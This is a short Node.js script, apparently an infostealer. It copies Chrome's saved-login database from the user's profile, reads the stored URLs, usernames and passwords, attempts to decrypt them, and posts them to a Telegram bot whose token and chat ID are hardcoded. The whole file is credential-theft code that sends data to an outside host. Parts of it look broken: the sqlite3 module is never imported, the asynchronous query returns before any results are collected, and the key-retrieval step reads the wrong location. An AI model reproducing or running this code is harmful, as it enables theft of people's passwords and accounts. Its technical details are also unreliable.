const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync } = require('child_process');
const crypto = require('crypto');
const axios = require('axios');

// Configuration
const CHROME_PASSWORDS_PATH = path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data');
const TELEGRAM_BOT_TOKEN = '7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E';
const TELEGRAM_CHAT_ID = '5375214810';

// Function to copy the Chrome passwords file
function copyChromePasswordsFile() {
    const tempFilePath = path.join(os.tmpdir(), 'chrome_passwords_temp.db');
    try {
        fs.copyFileSync(CHROME_PASSWORDS_PATH, tempFilePath);
        console.log('Chrome passwords file copied successfully.');
        return tempFilePath;
    } catch (error) {
        console.error('Failed to copy Chrome passwords file:', error);
        return null;
    }
}

// Function to extract passwords from the copied file
function extractPasswords(filePath) {
    const passwords = [];
    try {
        const db = new sqlite3.Database(filePath);
        db.serialize(() => {
            db.each("SELECT action_url, username_value, password_value FROM logins", (err, row) => {
                if (err) {
                    console.error('Error reading passwords:', err);
                    return;
                }
                const decryptedPassword = decryptPassword(row.password_value);
                passwords.push({
                    url: row.action_url,
                    username: row.username_value,
                    password: decryptedPassword
                });
            });
        });
        db.close();
        console.log('Passwords extracted successfully.');
        return passwords;
    } catch (error) {
        console.error('Failed to extract passwords:', error);
        return null;
    }
}

// Function to decrypt Chrome passwords
function decryptPassword(encryptedPassword) {
    const key = execSync('powershell -Command "Get-ItemProperty -Path \'HKCU:\\Software\\Google\\Chrome\\User Data\\Local State\' | Select-Object -ExpandProperty \'os_crypt\' | Select-Object -ExpandProperty \'encrypted_key\'"').toString().trim();
    const decodedKey = Buffer.from(key, 'base64').slice(5);
    const iv = encryptedPassword.slice(3, 15);
    const payload = encryptedPassword.slice(15);
    const decipher = crypto.createDecipheriv('aes-256-gcm', decodedKey, iv);
    let decrypted = decipher.update(payload, 'binary', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
}

// Function to send passwords to Telegram bot
function sendPasswordsToTelegram(passwords) {
    const message = passwords.map(entry => 
        `URL: ${entry.url}\nUsername: ${entry.username}\nPassword: ${entry.password}`
    ).join('\n\n');

    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: `Extracted Passwords:\n\n${message}`
    })
    .then(response => {
        console.log('Passwords sent to Telegram bot successfully.');
    })
    .catch(error => {
        console.error('Failed to send passwords to Telegram bot:', error);
    });
}

// Main function
function main() {
    const tempFilePath = copyChromePasswordsFile();
    if (tempFilePath) {
        const passwords = extractPasswords(tempFilePath);
        if (passwords) {
            sendPasswordsToTelegram(passwords);
        }
    }
}

main();
